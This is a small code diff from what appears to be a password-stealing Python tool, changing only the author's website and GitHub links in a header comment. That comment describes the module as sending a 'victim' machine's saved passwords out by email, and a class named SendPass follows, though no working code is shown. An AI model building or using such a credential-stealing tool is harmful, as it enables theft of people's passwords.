@@ -12,11 +12,10 @@ from os.path import basename
 
 #==================================================================
 #Author : Pushpender Singh
-#Website: https://technowlogy.tk
 #==================================================================
 #Usage: Module is send Saved Password of Victim machine to Email.
 #==================================================================
-#Github: https://github.com/Technowlogy-Pushpender/
+#Github: https://github.com/PushpenderIndia/
 #==================================================================
 
 class SendPass:
